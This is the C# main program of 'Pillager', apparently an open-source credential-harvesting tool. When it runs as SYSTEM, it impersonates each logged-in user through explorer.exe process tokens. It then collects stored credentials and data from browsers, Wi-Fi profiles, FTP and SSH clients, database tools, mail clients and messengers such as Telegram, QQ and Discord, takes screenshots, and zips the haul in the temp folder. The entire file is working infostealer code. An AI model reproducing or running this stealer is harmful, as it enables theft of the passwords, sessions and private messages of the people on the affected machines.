using System;
using System.Diagnostics;
using System.IO;
using Pillager.Browsers;
using Pillager.FTPs;
using Pillager.Helper;
using Pillager.Mails;
using Pillager.Messengers;
using Pillager.Others;
using Pillager.Softwares;
using Pillager.Tools;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
            string savezippath = savepath + ".zip";
            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
            if (File.Exists(savezippath)) File.Delete(savezippath);
            Directory.CreateDirectory(savepath);

            if (Environment.UserName.ToLower() == "system")
            {
                foreach (Process p in Process.GetProcesses())
                {
                    if (p.ProcessName.ToLower() == "explorer" && Methods.ImpersonateProcessToken(p.Id))
                    {
                        string usersavepath = Path.Combine(savepath, Methods.GetProcessUserName(p.Id));
                        Directory.CreateDirectory(usersavepath);
                        SaveAll(usersavepath);
                        Native.RevertToSelf();
                    }
                }
            }
            else
            {
                SaveAll(savepath);
            }

            //Zip
            ZipStorer zip = ZipStorer.Create(savezippath);
            foreach (var item in Directory.GetDirectories(savepath))
                zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
            foreach (var item in Directory.GetFiles(savepath))
                zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
            zip.Close();

            Directory.Delete(savepath, true);
        }

        static void SaveAll(string savepath)
        {
            //Browsers
            IE.Save(savepath);
            OldSogou.Save(savepath);//SogouExplorer < 12.x
            Chrome.Save(savepath);
            FireFox.Save(savepath);

            //Others
            Wifi.Save(savepath);
            ScreenShot.Save(savepath);

            //FTP
            WinSCP.Save(savepath);
            FileZilla.Save(savepath);
            CoreFTP.Save(savepath);
            Snowflake.Save(savepath);

            //Tools
            MobaXterm.Save(savepath);
            Xmanager.Save(savepath);
            Navicat.Save(savepath);
            RDCMan.Save(savepath);
            FinalShell.Save(savepath);
            SQLyog.Save(savepath);
            DBeaver.Save(savepath);
            TortoiseSVN.Save(savepath);
            SecureCRT.Save(savepath);

            //Softwares
            VSCode.Save(savepath);
            NeteaseCloudMusic.Save(savepath);

            //Mail
            MailMaster.Save(savepath);
            Foxmail.Save(savepath);
            Outlook.Save(savepath);
            MailBird.Save(savepath);

            //Messengers
            QQ.Save(savepath);
            Telegram.Save(savepath);
            Skype.Save(savepath);
            Enigma.Save(savepath);
            DingTalk.Save(savepath);
            Line.Save(savepath);
            Discord.Save(savepath);
        }
    }
}
